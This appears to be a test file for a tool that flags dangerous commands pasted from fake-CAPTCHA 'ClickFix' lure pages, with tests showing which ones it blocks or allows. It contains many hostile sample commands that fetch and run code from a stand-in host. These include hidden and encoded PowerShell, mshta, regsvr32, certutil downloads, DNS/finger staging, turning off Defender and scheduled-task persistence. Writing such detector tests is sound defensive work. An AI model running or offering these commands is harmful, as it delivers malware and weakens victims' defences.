import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyze } from '../src/index.ts';
import type { AnalyzeContext, CustodyRecord } from '../src/types.ts';
import { LURE_HOST, STAGE, caret, charCodes, encodePs } from './helpers.ts';

const lurePage: CustodyRecord = {
  sourceKind: 'browser',
  originUrl: `https://${LURE_HOST}/verify`,
  scriptWritten: true,
  visibleMatch: false,
  lureWords: ['Win+R', 'Ctrl+V', 'verify you are human'],
  fakeCaptcha: true,
};

const ids = (text: string, ctx?: AnalyzeContext) => analyze(text, ctx).findings.map((f) => f.id);

// ------------------------------------------------------------ malicious

const MALICIOUS: [string, string][] = [
  ['run-dialog classic', `powershell -w hidden -c "${STAGE}"`],
  ['encoded', `powershell -nop -w 1 -enc ${encodePs(STAGE)}`],
  ['mshta remote', `mshta https://${LURE_HOST}/check.hta`],
  ['mshta webdav', `mshta \\\\${LURE_HOST}@SSL\\DavWWWRoot\\check.hta`],
  ['msiexec remote', `msiexec /q /i https://${LURE_HOST}/update.msi`],
  ['rundll32 javascript', `rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()`],
  ['regsvr32 squiblydoo', `regsvr32 /s /n /u /i:https://${LURE_HOST}/f.sct scrobj.dll`],
  ['certutil download', `certutil -urlcache -split -f https://${LURE_HOST}/a.exe %TEMP%\\a.exe && start %TEMP%\\a.exe`],
  ['finger staging', `cmd /c finger verify@${LURE_HOST} | cmd`],
  ['dns staging', `cmd /c "for /f "tokens=*" %i in ('nslookup -q=txt stage.${LURE_HOST}') do %i"`],
  ['caret cmd', caret(`cmd /c start /min powershell -c "${STAGE}"`)],
  ['char codes', `& (${charCodes('iex')}) (iwr https://${LURE_HOST}/s.txt)`],
  ['mac base64', `echo ${Buffer.from(`curl -s https://${LURE_HOST}/i.sh | bash`).toString('base64')} | base64 -d | bash`],
  ['mac osascript', `osascript -e 'display dialog "Enter your password" default answer "" with hidden answer'`],
  ['mac quarantine', `curl -o /tmp/u https://${LURE_HOST}/u && xattr -c /tmp/u && chmod +x /tmp/u && /tmp/u`],
  ['defender off', `powershell Set-MpPreference -DisableRealtimeMonitoring $true; ${STAGE}`],
  ['persistence', `schtasks /create /sc onlogon /tn Updater /tr "powershell -w hidden -c ${STAGE}"`],
  ['ip host', `powershell -c "iwr http://203.0.113.7/a.ps1 | iex"`],
];

for (const [name, cmd] of MALICIOUS) {
  test(`no context: ${name} is at least warned`, () => {
    const v = analyze(cmd, { target: 'run' });
    assert.notEqual(v.action, 'allow', `${name} → ${v.action} ${v.risk} ${ids(cmd, { target: 'run' }).join(',')}`);
  });
  test(`lure page: ${name} is blocked`, () => {
    assert.equal(analyze(cmd, { target: 'run', custody: lurePage }).action, 'block');
  });
}

test('decoy comment alone makes a download-and-run block', () => {
  const v = analyze(`powershell -c "${STAGE}" # ✅ I am not a robot - Verification ID: 88231`, { target: 'run' });
  assert.equal(v.action, 'block');
  assert.ok(v.findings.some((f) => f.id === 'decoy-comment'));
});

test('FileFix: padded command with a fake document path is blocked', () => {
  const cmd = `powershell -c "${STAGE}"${' '.repeat(80)}# C:\\Company\\Internal\\HRPolicy.docx`;
  const v = analyze(cmd, { target: 'explorer' });
  assert.equal(v.action, 'block');
  assert.ok(v.findings.some((f) => f.id === 'decoy-path'));
});

test('ConsentFix-style visible "verification code" still blocks via lure words', () => {
  const v = analyze(`powershell -c "${STAGE}"`, {
    target: 'terminal',
    custody: { ...lurePage, visibleMatch: true },
  });
  assert.equal(v.action, 'block');
});

// ------------------------------------------------------------ benign

const BENIGN: [string, string, string?][] = [
  ['scoop', 'irm get.scoop.sh | iex'],
  ['scoop https', 'Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression'],
  [
    'chocolatey',
    "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
  ],
  ['homebrew', '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'],
  ['rustup', "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"],
  ['nvm', 'curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash'],
  ['uv windows', 'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"'],
  ['bun windows', 'powershell -c "irm bun.sh/install.ps1|iex"'],
  ['docker', 'docker run -it --rm -p 8080:80 nginx:latest'],
  ['winget', 'winget install --id Git.Git -e --source winget'],
  ['pip', 'pip install --upgrade requests'],
  ['git', 'git clone https://github.com/torvalds/linux.git && cd linux'],
  ['npm', 'npm create vite@latest my-app -- --template react-ts'],
  ['ps listing', 'Get-ChildItem -Path C:\\Users -Recurse -Filter *.log | Remove-Item'],
  ['ps exec policy', 'Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser'],
  ['curl api', 'curl -s https://api.github.com/repos/nodejs/node/releases/latest | jq .tag_name'],
  ['ssh', 'ssh-keygen -t ed25519 -C "dev@example.com"'],
  ['wsl', 'wsl --install -d Ubuntu'],
  ['dotnet', 'dotnet new console -n Hello && cd Hello && dotnet run'],
  ['plain text', 'Meeting moved to 4pm, see https://calendar.example.com/x'],
];

for (const [name, cmd] of BENIGN) {
  test(`benign: ${name} passes silently`, () => {
    const v = analyze(cmd, { target: 'terminal' });
    assert.equal(v.action, 'allow', `${name} → ${v.action} ${v.risk} ${v.findings.map((f) => f.id).join(',')}`);
  });
}

test('unknown installer copied visibly from its own site passes; typed by hand it warns', () => {
  const cmd = 'curl -fsSL https://get.sometool.dev/install.sh | sh';
  assert.equal(analyze(cmd).action, 'warn');
  const v = analyze(cmd, { custody: { originUrl: 'https://sometool.dev/docs', scriptWritten: true, visibleMatch: true } });
  assert.equal(v.action, 'allow');
});

test('GitHub README installer from the same org passes', () => {
  const cmd = 'curl -fsSL https://raw.githubusercontent.com/acme-dev/tool/main/install.sh | bash';
  const v = analyze(cmd, { custody: { originUrl: 'https://github.com/acme-dev/tool', visibleMatch: true } });
  assert.equal(v.action, 'allow');
  assert.ok(v.findings.some((f) => f.id === 'same-site'));
  // Another org's README is still a docs site the user read, so only a smaller discount.
  const other = analyze(cmd, { custody: { originUrl: 'https://github.com/someone-else/repo', visibleMatch: true } });
  assert.ok(other.findings.some((f) => f.id === 'docs-site'));
  const blog = analyze(cmd, { custody: { originUrl: 'https://random-blog.example/post', visibleMatch: true } });
  assert.equal(blog.action, 'warn');
});

test('a trusted origin never silences a critical behaviour', () => {
  const v = analyze(`mshta https://docs.example.dev/x.hta`, { custody: { originUrl: 'https://docs.example.dev/', visibleMatch: true } });
  assert.notEqual(v.action, 'allow');
});

test('lure words on a tutorial page with a manual selection do not block an installer', () => {
  const v = analyze('irm get.scoop.sh | iex', {
    custody: { originUrl: 'https://blog.example.dev/setup', scriptWritten: false, visibleMatch: true, lureWords: ['Win+R'] },
  });
  assert.equal(v.action, 'allow');
});

test('hidden copy of harmless text is allowed (nothing to run)', () => {
  assert.equal(analyze('hello world', { custody: lurePage }).action, 'allow');
});

test('chat-app source raises a risky command', () => {
  const v = analyze(`curl -fsSL https://get.sometool.dev/i.sh | sh`, {
    custody: { sourceKind: 'app', sourceApp: 'WhatsApp.exe' },
  });
  assert.ok(v.findings.some((f) => f.id === 'from-chat' && f.params?.app === 'WhatsApp'));
});

test('stays fast on large and adversarial input', () => {
  const big = `${'A'.repeat(50_000)} ${STAGE} ${'+'.repeat(10_000)}`;
  const v = analyze(big);
  assert.ok(v.ms < 200, `${v.ms}ms`);
  const nested = `'a'+`.repeat(2000) + `'b'`;
  assert.ok(analyze(nested).ms < 200);
});

test('padding past the input limit does not hide the command', () => {
  for (const pad of [' '.repeat(100_000), '\n'.repeat(100_000), 'x'.repeat(100_000) + '\n']) {
    const v = analyze(`${pad}powershell -c "${STAGE}"`, { target: 'terminal' });
    assert.notEqual(v.action, 'allow', `${JSON.stringify(pad.slice(0, 3))}… padding`);
  }
});
